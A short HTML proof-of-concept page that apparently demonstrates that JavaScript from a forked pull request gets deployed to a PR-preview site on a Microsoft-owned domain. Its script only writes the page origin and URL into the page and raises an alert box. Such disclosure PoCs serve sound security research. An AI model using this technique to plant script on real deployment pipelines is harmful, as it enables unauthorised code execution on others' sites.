<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>PR Preview</title>
</head>
<body>
    <h1>PR Preview - POC</h1>
    <p>This page demonstrates that attacker-controlled JavaScript can be deployed to Microsoft-owned domain.</p>
    <div id="poc-status">Loading...</div>
    <script>
        // Inject proof of concept
        document.getElementById('poc-status').innerHTML = 
            '<h2 style="color:red;">🔥 POC: Attacker JavaScript executed on ' + 
            location.origin + '</h2>' +
            '<p>This script was deployed from a forked pull request!</p>' +
            '<p>Current URL: ' + location.href + '</p>';
        
        // Send alert to confirm execution
        alert('POC: Attacker JavaScript executed on Microsoft-owned domain: ' + location.origin);
    </script>
</body>
</html>
